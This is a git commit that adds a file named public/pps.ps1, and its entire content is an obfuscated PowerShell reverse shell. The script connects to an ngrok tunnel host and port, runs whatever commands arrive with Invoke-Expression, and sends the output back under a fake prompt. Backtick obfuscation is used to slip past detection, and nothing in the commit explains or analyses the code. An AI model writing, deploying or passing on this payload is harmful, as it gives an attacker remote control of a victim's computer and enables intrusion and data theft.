6188b6d7abf39298669497dadb322994f5e7b698
nankehang <nankehang@users.noreply.github.com>
2026-03-04 13:57:11 +0700

    add pps.ps1

---
+++ public/pps.ps1
@@ -0,0 +1,9 @@
+$z=1;while($z-ne 0){switch($z){
+  1{$c=n`ew-object net.sockets.tcpclient('0.tcp.ap.ngrok.io',15706);$g=$c.GetStream();$z=2}
+  2{[byte[]]$b=0..65535|% {0};$z=3}
+  3{if(($i=$g.Read($b,0,$b.Length))-ne 0){
+      $t=[text.encoding]::ASCII.GetString($b,0,$i);
+      $r=(i`ex $t 2>&1|out-string);
+      $f=[text.encoding]::ASCII.GetBytes($r+"PS "+(gl).path+"> ");
+      $g.Write($f,0,$f.Length);$z=3}else{$z=0}}
+}}
